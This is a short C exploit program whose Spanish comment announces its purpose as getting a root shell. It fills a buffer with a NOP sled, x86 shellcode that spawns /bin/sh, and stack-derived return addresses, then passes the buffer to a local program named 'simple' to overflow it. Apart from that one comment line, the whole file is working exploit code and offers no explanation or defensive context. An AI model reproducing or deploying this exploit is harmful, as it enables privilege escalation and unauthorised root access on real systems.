/*Consigue una shell root*/

#include <stdio.h>

char buffer[1040];
int i;
char *ptr;
unsigned long *ptr2;

main()
{

long get_sp(void)
{
__asm__("movl %esp,%eax\n");
}
char execshell[] =
"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";

for(i=0;i<1040;i++)
buffer[i]=0x00;
ptr=buffer;

for(i=0;i<1024-strlen(execshell);i++)
*(ptr++)=0x90;
for(i=0;i<strlen(execshell);i++)
*(ptr++)=execshell[i];
ptr2=(long *)ptr;
for(i=0;i<4;i++)
*(ptr2++)=get_sp()-1000;

execl("./simple", "simple", buffer, 0);
}
